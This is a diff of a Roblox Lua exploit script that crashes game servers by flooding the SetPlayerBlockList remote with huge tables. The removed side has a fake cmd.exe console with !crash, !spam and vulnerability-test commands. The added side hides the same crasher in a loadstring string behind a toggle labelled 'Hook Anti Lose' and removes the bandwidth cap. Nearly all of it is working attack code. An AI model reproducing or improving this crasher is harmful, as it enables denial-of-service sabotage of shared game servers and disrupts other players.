@@ -1,67 +1,77 @@
---!nonstrict
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
-local Stats = game:GetService("Stats")
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- ═══════════ CORE LOGIC ═══════════
-local TargetSize     = 180000 -- Total items to send when crashing
-local ChunkSize      = 10000  -- Safe amount per packet to avoid Error 261
-local Format         = "pair"
-
-local state = { running = false, thread = nil, remote = nil, chunkCache = nil, passes = 0, isSpam = false }
-local RemoteCandidates = {
-    { "RobloxReplicatedStorage", "SetPlayerBlockList" },
-    { "ReplicatedStorage",       "SetPlayerBlockList" },
+local COLORS = {
+    bg = Color3.fromRGB(14, 14, 16),
+    surface = Color3.fromRGB(22, 22, 26),
+    disabled = Color3.fromRGB(38, 38, 44),
+    border = Color3.fromRGB(60, 60, 68),
+    accent = Color3.fromRGB(230, 35, 35),
+    accentDark = Color3.fromRGB(170, 22, 22),
+    accentBright = Color3.fromRGB(255, 70, 70),
+    crimson = Color3.fromRGB(110, 15, 15),
+    text = Color3.fromRGB(238, 238, 242),
+    white = Color3.fromRGB(255, 255, 255),
+    black = Color3.fromRGB(0, 0, 0),
 }
-local spamRemotes = {}
+
+local FONT = Enum.Font.GothamBlack
+
+local SRC = [==[
+local RunService = game:GetService("RunService")
+
+local Children       = 150000
+local NestedPerChild = 0
+local FieldsPerChild = 0
+local FireBurst      = 1
+local FrameDelay     = 0.125
+local FieldSize      = 0
+local RebuildEach    = false
+
+local state = {
+    running = false,
+    thread  = nil,
+    remote  = nil,
+    cache   = nil,
+    pad     = "",
+}
 
 local function resolve()
-    for _, path in ipairs(RemoteCandidates) do
-        local node, ok = game, true
-        for i = 1, #path do
-            local nxt = node:FindFirstChild(path[i])
-            if not nxt then ok = false; break end
-            node = nxt
-        end
-        if ok and node and (node:IsA("RemoteEvent") or node:IsA("UnreliableRemoteEvent")) then
-            return node
-        end
+    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+    if not rrs then return nil end
+    local r = rrs:FindFirstChild("SetPlayerBlockList")
+    if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then
+        return r
     end
     return nil
 end
 
-local function findSpamRemotes()
-    table.clear(spamRemotes)
-    local rs = game:GetService("ReplicatedStorage")
-    if rs then
-        for _, obj in ipairs(rs:GetDescendants()) do
-            if obj:IsA("RemoteEvent") and not obj.Name:lower():match("chat") and not obj.Name:lower():match("mouse") then
-                table.insert(spamRemotes, obj)
-            end
+state.remote = resolve()
+
+pcall(function()
+    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+end)
+
+state.pad = FieldSize > 0 and string.rep("P", FieldSize) or ""
+
+local function build()
+    local root = table.create(Children)
+    for i = 1, Children do
+        local entry = { id = i, v = i * 2 }
+        for k = 1, FieldsPerChild do
+            entry["k" .. k] = (FieldSize > 0) and state.pad or (i + k)
         end
+        for j = 1, NestedPerChild do
+            entry["n" .. j] = { a = i, b = j }
+        end
+        root[i] = entry
     end
-end
-
-local function buildChunk(size)
-    local sz = size or ChunkSize
-    local root = table.create(sz)
-    for i = 1, sz do root[i] = { id = i, v = i * 2 } end
     return root
-end
-
-local function sendPayload(remote)
-    if not state.chunkCache then state.chunkCache = buildChunk() end
-    local chunksNeeded = math.ceil(TargetSize / ChunkSize)
-    
-    for _ = 1, chunksNeeded do
-        pcall(function() remote:FireServer(state.chunkCache) end)
-        task.wait(0.02) 
-    end
-    state.passes += 1
 end
 
 local function fire()
@@ -69,405 +79,252 @@ local function fire()
         state.remote = resolve()
         if not state.remote then return end
     end
-    
-    if state.isSpam then
-        local chunksNeeded = math.ceil(TargetSize / ChunkSize)
-        for _, r in ipairs(spamRemotes) do
-            for _ = 1, chunksNeeded do
-                pcall(function() r:FireServer(state.chunkCache) end)
-                task.wait(0.02)
-            end
-        end
+    local payload
+    if RebuildEach or not state.cache then
+        payload = build()
+        if not RebuildEach then state.cache = payload end
     else
-        sendPayload(state.remote)
+        payload = state.cache
+    end
+    for _ = 1, FireBurst do
+        state.remote:FireServer(payload)
     end
 end
 
-local function getPing()
-    local ok, p = pcall(function() return Stats.Network.ServerStatsItem["Data Ping"]:GetValue() end)
-    return ok and math.floor(p) or 0
-end
-
-local function startCrash(isSpam)
+local function start()
     if state.running then return end
     state.running = true
-    state.isSpam = isSpam
-    state.passes = 0
-    
-    if not state.chunkCache then state.chunkCache = buildChunk() end
-    if isSpam then findSpamRemotes() end
-    
+    state.cache = nil
     state.thread = task.spawn(function()
         while state.running do
             pcall(fire)
-            task.wait(0.05) -- No countdown, just fast continuous crashing
+            if FrameDelay > 0 then
+                task.wait(FrameDelay)
+            else
+                RunService.Heartbeat:Wait()
+            end
         end
     end)
 end
 
-local function stopCrash()
+local function stop()
     state.running = false
     if state.thread then pcall(task.cancel, state.thread) end
     state.thread = nil
-    state.chunkCache = nil
+    state.cache = nil
 end
 
--- ═══════════ CMD PROMPT UI ═══════════
+return {
+    start  = start,
+    stop   = stop,
+    toggle = function() if state.running then stop() else start() end end,
+    isRunning = function() return state.running end,
+}
+]==]
+
+local loader = coroutine.create(function()
+    local chunk = loadstring(SRC)
+    if not chunk then return end
+    local ok, api = pcall(chunk)
+    if ok and type(api) == "table" then
+        _G.__ALT = api
+    end
+end)
+
+coroutine.resume(loader)
+loader = nil
+
+local api = _G.__ALT
+_G.__ALT = nil
+
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "CmdPrompt"
+screenGui.Name = "AntiLoseUI"
 screenGui.ResetOnSpawn = false
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.IgnoreGuiInset = true
 screenGui.Parent = playerGui
 
 local main = Instance.new("Frame")
-main.Size = UDim2.new(0, 700, 0, 450)
+main.Name = "MainFrame"
+main.Size = UDim2.new(0, 210, 0, 92)
 main.Position = UDim2.new(0.5, 0, 0.5, 0)
 main.AnchorPoint = Vector2.new(0.5, 0.5)
-main.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
-main.BorderSizePixel = 1
-main.BorderColor3 = Color3.fromRGB(60, 60, 60)
-main.Active = true 
+main.BackgroundColor3 = COLORS.bg
+main.BorderSizePixel = 0
+main.ClipsDescendants = false
 main.Parent = screenGui
 
-local titleBar = Instance.new("Frame")
-titleBar.Size = UDim2.new(1, 0, 0, 30)
-titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-titleBar.BorderSizePixel = 0
-titleBar.Parent = main
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 10)
+mainCorner.Parent = main
 
-local titleText = Instance.new("TextLabel")
-titleText.Size = UDim2.new(1, -80, 1, 0)
-titleText.Position = UDim2.new(0, 12, 0, 0)
-titleText.BackgroundTransparency = 1
-titleText.Font = Enum.Font.Code
-titleText.Text = "C:\\Windows\\System32\\cmd.exe"
-titleText.TextColor3 = Color3.fromRGB(200, 200, 200)
-titleText.TextSize = 14
-titleText.TextXAlignment = Enum.TextXAlignment.Left
-titleText.Parent = titleBar
+local mainGrad = Instance.new("UIGradient")
+mainGrad.Color = ColorSequence.new(COLORS.bg, Color3.fromRGB(22, 14, 14))
+mainGrad.Rotation = 135
+mainGrad.Parent = main
 
-local minBtn = Instance.new("TextButton")
-minBtn.Size = UDim2.new(0, 35, 1, 0)
-minBtn.Position = UDim2.new(1, -70, 0, 0)
-minBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-minBtn.BorderSizePixel = 0
-minBtn.Font = Enum.Font.Code
-minBtn.Text = "-"
-minBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-minBtn.TextSize = 16
-minBtn.Parent = titleBar
+local borderFrame = Instance.new("Frame")
+borderFrame.Name = "BorderFrame"
+borderFrame.Size = UDim2.new(1, 2, 1, 2)
+borderFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+borderFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+borderFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+borderFrame.BorderSizePixel = 0
+borderFrame.ZIndex = 0
+borderFrame.Parent = main
 
-local closeBtn = Instance.new("TextButton")
-closeBtn.Size = UDim2.new(0, 35, 1, 0)
-closeBtn.Position = UDim2.new(1, -35, 0, 0)
-closeBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-closeBtn.BorderSizePixel = 0
-closeBtn.Font = Enum.Font.Code
-closeBtn.Text = "X"
-closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-closeBtn.TextSize = 14
-closeBtn.Parent = titleBar
+local borderCorner = Instance.new("UICorner")
+borderCorner.CornerRadius = UDim.new(0, 11)
+borderCorner.Parent = borderFrame
 
-closeBtn.MouseButton1Click:Connect(function() screenGui:Destroy() end)
+local borderGrad = Instance.new("UIGradient")
+borderGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0.0, Color3.fromRGB(40, 5, 5)),
+    ColorSequenceKeypoint.new(0.25, Color3.fromRGB(180, 20, 20)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 90, 90)),
+    ColorSequenceKeypoint.new(0.75, Color3.fromRGB(180, 20, 20)),
+    ColorSequenceKeypoint.new(1.0, Color3.fromRGB(40, 5, 5)),
+})
+borderGrad.Rotation = 0
+borderGrad.Parent = borderFrame
 
-local consoleFrame = Instance.new("ScrollingFrame")
-consoleFrame.Size = UDim2.new(1, -16, 1, -70)
-consoleFrame.Position = UDim2.new(0, 8, 0, 35)
-consoleFrame.BackgroundTransparency = 1
-consoleFrame.BorderSizePixel = 0
-consoleFrame.ScrollBarThickness = 10
-consoleFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
-consoleFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
-consoleFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-consoleFrame.Parent = main
+local innerMask = Instance.new("Frame")
+innerMask.Name = "InnerMask"
+innerMask.Size = UDim2.new(1, -2, 1, -2)
+innerMask.Position = UDim2.new(0.5, 0, 0.5, 0)
+innerMask.AnchorPoint = Vector2.new(0.5, 0.5)
+innerMask.BackgroundColor3 = COLORS.bg
+innerMask.BorderSizePixel = 0
+innerMask.ZIndex = 1
+innerMask.Parent = main
 
-local listLayout = Instance.new("UIListLayout")
-listLayout.Padding = UDim.new(0, 3)
-listLayout.SortOrder = Enum.SortOrder.LayoutOrder
-listLayout.Parent = consoleFrame
+local innerCorner = Instance.new("UICorner")
+innerCorner.CornerRadius = UDim.new(0, 9)
+innerCorner.Parent = innerMask
 
-local inputBar = Instance.new("Frame")
-inputBar.Size = UDim2.new(1, -16, 0, 28)
-inputBar.Position = UDim2.new(0, 8, 1, -34)
-inputBar.BackgroundTransparency = 1
-inputBar.Parent = main
+local innerGrad = Instance.new("UIGradient")
+innerGrad.Color = ColorSequence.new(COLORS.bg, Color3.fromRGB(22, 14, 14))
+innerGrad.Rotation = 135
+innerGrad.Parent = innerMask
 
-local promptLabel = Instance.new("TextLabel")
-promptLabel.Size = UDim2.new(0, 160, 1, 0)
-promptLabel.BackgroundTransparency = 1
-promptLabel.Font = Enum.Font.Code
-promptLabel.Text = "C:\\Users\\Admin>"
-promptLabel.TextColor3 = Color3.fromRGB(0, 255, 0) 
-promptLabel.TextSize = 15
-promptLabel.TextXAlignment = Enum.TextXAlignment.Left
-promptLabel.Parent = inputBar
+local title = Instance.new("TextLabel")
+title.Name = "Title"
+title.Size = UDim2.new(1, 0, 0, 34)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundTransparency = 1
+title.Font = FONT
+title.Text = "Hook Anti Lose"
+title.TextColor3 = COLORS.text
+title.TextSize = 14
+title.TextXAlignment = Enum.TextXAlignment.Center
+title.ZIndex = 3
+title.Parent = main
 
-local inputBox = Instance.new("TextBox")
-inputBox.Size = UDim2.new(1, -165, 1, 0)
-inputBox.Position = UDim2.new(0, 160, 0, 0)
-inputBox.BackgroundTransparency = 1
-inputBox.Font = Enum.Font.Code
-inputBox.Text = ""
-inputBox.TextColor3 = Color3.fromRGB(0, 255, 0) 
-inputBox.TextSize = 15
-inputBox.TextXAlignment = Enum.TextXAlignment.Left
-inputBox.ClearTextOnFocus = false
-inputBox.Active = true
-inputBox.Parent = inputBar
+local toggle = Instance.new("TextButton")
+toggle.Name = "Toggle"
+toggle.Size = UDim2.new(1, -20, 0, 38)
+toggle.Position = UDim2.new(0, 10, 0, 44)
+toggle.BackgroundColor3 = COLORS.disabled
+toggle.BorderSizePixel = 0
+toggle.Font = FONT
+toggle.Text = ""
+toggle.TextTransparency = 1
+toggle.AutoButtonColor = false
+toggle.ZIndex = 3
+toggle.Parent = main
 
-local cursor = Instance.new("TextLabel")
-cursor.Size = UDim2.new(0, 10, 1, 0)
-cursor.Position = UDim2.new(0, 160, 0, 0)
-cursor.BackgroundTransparency = 1
-cursor.Font = Enum.Font.Code
-cursor.Text = "_"
-cursor.TextColor3 = Color3.fromRGB(0, 255, 0)
-cursor.TextSize = 15
-cursor.Visible = false
-cursor.Parent = inputBar
+local toggleCorner = Instance.new("UICorner")
+toggleCorner.CornerRadius = UDim.new(0, 8)
+toggleCorner.Parent = toggle
 
-inputBox:GetPropertyChangedSignal("Text"):Connect(function()
-    local textWidth = #inputBox.Text * 10.5 
-    cursor.Position = UDim2.new(0, 160 + textWidth, 0, 0)
+local toggleGrad = Instance.new("UIGradient")
+toggleGrad.Color = ColorSequence.new(COLORS.disabled, Color3.fromRGB(48, 48, 54))
+toggleGrad.Rotation = 135
+toggleGrad.Parent = toggle
+
+local toggleStroke = Instance.new("UIStroke")
+toggleStroke.Color = COLORS.crimson
+toggleStroke.Thickness = 1.66
+toggleStroke.Transparency = 0
+toggleStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+toggleStroke.Parent = toggle
+
+local toggleLabel = Instance.new("TextLabel")
+toggleLabel.Name = "Label"
+toggleLabel.Size = UDim2.new(1, 0, 1, 0)
+toggleLabel.Position = UDim2.new(0, 0, 0, 0)
+toggleLabel.BackgroundTransparency = 1
+toggleLabel.Font = FONT
+toggleLabel.Text = "DISABLED"
+toggleLabel.TextColor3 = COLORS.white
+toggleLabel.TextTransparency = 0
+toggleLabel.TextSize = 14
+toggleLabel.TextXAlignment = Enum.TextXAlignment.Center
+toggleLabel.TextYAlignment = Enum.TextYAlignment.Center
+toggleLabel.ZIndex = 5
+toggleLabel.Active = false
+toggleLabel.Parent = toggle
+
+local active = false
+
+RunService.RenderStepped:Connect(function(dt)
+    local speed = active and 160 or 60
+    borderGrad.Rotation = (borderGrad.Rotation + speed * dt) % 360
 end)
 
-inputBar.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        inputBox:CaptureFocus()
-    end
-end)
+local function setActive(state)
+    active = state
 
-inputBox.Focused:Connect(function() cursor.Visible = true end)
-
-task.spawn(function()
-    while screenGui.Parent do
-        task.wait(0.5)
-        if inputBox:IsFocused() then
-            cursor.Visible = not cursor.Visible
-        else
-            cursor.Visible = false
+    if state then
+        toggle.BackgroundColor3 = COLORS.accentBright
+        toggleGrad.Color = ColorSequence.new(COLORS.accent, COLORS.accentBright)
+        toggleGrad.Rotation = 0
+        toggleStroke.Color = COLORS.accentBright
+        toggleLabel.Text = "ENABLED"
+        toggleLabel.TextColor3 = COLORS.black
+        if api and api.start then
+            pcall(api.start)
+        end
+    else
+        toggle.BackgroundColor3 = COLORS.disabled
+        toggleGrad.Color = ColorSequence.new(COLORS.disabled, Color3.fromRGB(48, 48, 54))
+        toggleGrad.Rotation = 135
+        toggleStroke.Color = COLORS.crimson
+        toggleLabel.Text = "DISABLED"
+        toggleLabel.TextColor3 = COLORS.white
+        if api and api.stop then
+            pcall(api.stop)
         end
     end
-end)
-
-local function log(text, color)
-    local txt = Instance.new("TextLabel")
-    txt.Size = UDim2.new(1, 0, 0, 20)
-    txt.BackgroundTransparency = 1
-    txt.Font = Enum.Font.Code
-    txt.Text = text
-    txt.TextColor3 = color or Color3.fromRGB(0, 255, 0)
-    txt.TextSize = 14
-    txt.TextXAlignment = Enum.TextXAlignment.Left
-    txt.TextWrapped = true
-    txt.Parent = consoleFrame
-    task.defer(function()
-        consoleFrame.CanvasPosition = Vector2.new(0, listLayout.AbsoluteContentSize.Y)
-    end)
 end
+
+toggle.MouseButton1Click:Connect(function()
+    setActive(not active)
+end)
 
 local dragging = false
 local dragStart, startPos
 
-titleBar.InputBegan:Connect(function(input)
+main.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        if input.Position.X >= minBtn.AbsolutePosition.X and input.Position.X <= (closeBtn.AbsolutePosition.X + closeBtn.AbsoluteSize.X) then
-            return
-        end
         dragging = true
         dragStart = input.Position
         startPos = main.Position
-        
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
-        end)
     end
 end)
 
 UserInputService.InputChanged:Connect(function(input)
     if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
         local delta = input.Position - dragStart
-        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        main.Position = UDim2.new(
+            startPos.X.Scale, startPos.X.Offset + delta.X,
+            startPos.Y.Scale, startPos.Y.Offset + delta.Y
+        )
     end
 end)
 
-local isMinimized = false
-minBtn.MouseButton1Click:Connect(function()
-    isMinimized = not isMinimized
-    if isMinimized then
-        main.Size = UDim2.new(0, 700, 0, 30)
-        consoleFrame.Visible = false
-        inputBar.Visible = false
-    else
-        main.Size = UDim2.new(0, 700, 0, 450)
-        consoleFrame.Visible = true
-        inputBar.Visible = true
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
     end
 end)
-
--- ═══════════ COMMAND HANDLER ═══════════
-local function processCommand(input)
-    local cmd = string.lower(input)
-    local args = string.split(cmd, " ")
-    
-    log("C:\\Users\\Admin> " .. input, Color3.fromRGB(255, 255, 255))
-    
-    if cmd == "!help" then
-        log("Available Commands:", Color3.fromRGB(0, 255, 0))
-        log("  !test           - Check if server is vulnerable (Capped at 200k)", Color3.fromRGB(0, 200, 255))
-        log("  !crash          - Start continuous crash (180k)", Color3.fromRGB(200, 200, 200))
-        log("  !spam           - Spray ALL remotes at once", Color3.fromRGB(255, 100, 255))
-        log("  !stop           - Stop the payload", Color3.fromRGB(200, 200, 200))
-        log("  !limit          - Auto-test up to 200k safely", Color3.fromRGB(200, 200, 200))
-        log("  !size <number>  - Set target payload size", Color3.fromRGB(200, 200, 200))
-        log("  !ping           - Check server ping", Color3.fromRGB(200, 200, 200))
-        log("  !cls            - Clear screen", Color3.fromRGB(200, 200, 200))
-        log("  !exit           - Close prompt", Color3.fromRGB(200, 200, 200))
-        
-    elseif cmd == "!test" then
-        log("[*] Starting Safe Server Test...", Color3.fromRGB(0, 200, 255))
-        task.spawn(function()
-            local remote = resolve()
-            if not remote then 
-                log("[!] Remote not found. Server is completely patched.", Color3.fromRGB(255, 50, 50)) 
-                return 
-            end
-            
-            local wasRunning = state.running
-            if wasRunning then stopCrash() end
-            
-            -- ✅ TEST CAPPED EXACTLY AT 200K
-            local testSize = 200000
-            local chunks = math.ceil(testSize / ChunkSize)
-            log("[*] Firing " .. testSize .. " payload (Safe Chunking)...", Color3.fromRGB(200, 200, 200))
-            
-            local before = getPing()
-            local p = buildChunk()
-            
-            for i = 1, chunks do
-                pcall(function() remote:FireServer(p) end)
-                task.wait(0.02)
-            end
-            
-            log("[*] Waiting for server to process...", Color3.fromRGB(200, 200, 200))
-            task.wait(3)
-            
-            local after = getPing()
-            local spike = after - before
-            
-            log(string.format("[*] Baseline: %dms | After: %dms | Spike: %dms", before, after, spike), Color3.fromRGB(200, 200, 200))
-            
-            if spike > 100 or after > 400 then
-                log("[+] VERDICT: SERVER IS VULNERABLE! It will crash.", Color3.fromRGB(0, 255, 0))
-                log("[+] Type '!crash' to kill it.", Color3.fromRGB(0, 255, 0))
-            else
-                log("[-] VERDICT: SERVER IS PATCHED OR TOO STRONG.", Color3.fromRGB(255, 50, 50))
-            end
-            
-            if wasRunning then startCrash(false) end
-        end)
-
-    elseif cmd == "!spam" then
-        if state.running then stopCrash() end
-        log("[!!!] SPAM MODE ACTIVATED. Spraying ALL remotes...", Color3.fromRGB(255, 100, 255))
-        startCrash(true)
-
-    elseif cmd == "!crash" then
-        if state.running then
-            log("[!] Payload is already running!", Color3.fromRGB(255, 200, 50))
-        else
-            startCrash(false)
-            log("[+] Crasher started. Firing continuously.", Color3.fromRGB(0, 255, 0))
-        end
-        
-    elseif cmd == "!stop" then
-        if not state.running then
-            log("[!] Payload is not running.", Color3.fromRGB(255, 200, 50))
-        else
-            stopCrash()
-            log("[-] Payload stopped.", Color3.fromRGB(255, 50, 50))
-        end
-        
-    elseif cmd == "!ping" then
-        local p = getPing()
-        log("[*] Current Server Ping: " .. p .. "ms", Color3.fromRGB(0, 200, 255))
-        
-    elseif cmd == "!limit" then
-        log("[*] Starting Auto-Limit Test (Pushing up to 200k)...", Color3.fromRGB(0, 200, 255))
-        task.spawn(function()
-            local remote = resolve()
-            if not remote then return end
-            
-            local wasRunning = state.running
-            if wasRunning then stopCrash() end
-            
-            -- ✅ LIMIT PUSHES TO 200K SAFELY
-            local sizes = {25000, 50000, 100000, 150000, 200000}
-            local bestSize = 25000
-            
-            for _, sz in ipairs(sizes) do
-                log("[*] Testing " .. sz .. " payload...", Color3.fromRGB(200, 200, 200))
-                local chunks = math.ceil(sz / ChunkSize)
-                local p = buildChunk()
-                
-                for i = 1, chunks do
-                    pcall(function() remote:FireServer(p) end)
-                    task.wait(0.02)
-                end
-                
-                log("[*] Waiting 3s for server to process...", Color3.fromRGB(200, 200, 200))
-                task.wait(3)
-                bestSize = sz
-            end
-            
-            log("[*] MAX SAFE TEST LIMIT REACHED: " .. bestSize, Color3.fromRGB(0, 200, 255))
-            log("[*] TargetSize for crash remains at " .. TargetSize, Color3.fromRGB(0, 255, 0))
-            
-            if wasRunning then startCrash(false) end
-        end)
-        
-    elseif cmd == "!cls" then
-        for _, v in ipairs(consoleFrame:GetChildren()) do
-            if v:IsA("TextLabel") then v:Destroy() end
-        end
-        
-    elseif cmd == "!exit" then
-        screenGui:Destroy()
-        
-    elseif args[1] == "!size" then
-        local num = tonumber(args[2])
-        if num and num > 1000 then
-            TargetSize = math.floor(num)
-            state.chunkCache = nil
-            log("[+] Target size set to " .. tostring(TargetSize), Color3.fromRGB(0, 255, 0))
-        else
-            log("[!] Invalid number. Example: !size 180000", Color3.fromRGB(255, 50, 50))
-        end
-        
-    elseif cmd == "" then
-        -- Do nothing
-    else
-        log("'" .. cmd .. "' is not recognized as an internal or external command,", Color3.fromRGB(255, 50, 50))
-    end
-end
-
-inputBox.FocusLost:Connect(function(enterPressed)
-    if enterPressed then
-        local text = inputBox.Text
-        inputBox.Text = ""
-        if text ~= "" then
-            processCommand(text)
-        end
-    end
-end)
-
-log("Microsoft Windows [Version 10.0.19045.3803]", Color3.fromRGB(200, 200, 200))
-log("(c) Microsoft Corporation. All rights reserved.", Color3.fromRGB(200, 200, 200))
-log("", Color3.fromRGB(200, 200, 200))
-log("Type '!help' for a list of available commands.", Color3.fromRGB(0, 255, 0))
-log("Pro tip: !test and !limit are now safely capped at 200k.", Color3.fromRGB(0, 200, 255))
-log("", Color3.fromRGB(200, 200, 200))
-
-inputBox:CaptureFocus()
